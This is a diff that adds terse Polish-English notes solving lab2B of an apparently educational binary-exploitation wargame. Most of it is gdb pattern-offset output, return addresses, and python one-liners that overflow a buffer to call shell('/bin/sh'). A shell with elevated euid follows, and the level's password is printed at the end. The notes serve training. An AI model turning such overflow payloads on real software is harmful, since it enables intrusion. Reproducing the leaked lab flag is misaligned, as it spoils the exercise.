@@ -1,0 +1,45 @@
+r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
+t: 27
+EIP: 0x3b414144 ('DAA;')
+
+gdb-peda$ pattern offset 0x3b414144
+994132292 found at offset
+
+AAA%AAsAABAA$AAnAACAA-AA(AABBBBAA)AAEAAa
+
+adres void shell() -> 0x08 04 86 BD
+\xBD\x86\x04\x08
+
+python -c 'print "A"*27+"\xBD\x86\x04\x08"+"C"*10'
+
+
+080486C9
+
+\xc9\x86\x04\x08
+
+python -c 'print "A"*27+"\xc9\x86\x04\x08"+"C"*10'
+
+Trzeba przekazać jeszcze parametry do funkcji do /bin/sh!
+void shell(char* cmd)
+
+gdb-peda$ r "$(python -c 'print "A"*27+"\xc9\x86\x04\x08"+"ABC"')"
+
+arg[0]: 0x434241 ('ABC')
+a powinno odnieść do char* exec_string = "/bin/sh"; <- jest on pod
+.rodata:080487D0 aBinSh          db '/bin/sh',0          ; DATA XREF: .data:exec_string↓o
+
+0x080487D0
+0x08 04 87 D0
+
+\xD0\x87\x04\x08
+
+
+więc:
+lab2B@warzone:/levels/lab02$ ./lab2B "$(python -c 'print "A"*27+"\xc9\x86\x04\x08"+"\xD0\x87\x04\x08"')"
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAЇ
+$ id
+uid=1007(lab2B) gid=1008(lab2B) euid=1008(lab2A) groups=1009(lab2A),1001(gameuser),1008(lab2B)
+$
+
+i_c4ll_wh4t_i_w4nt_n00b
+
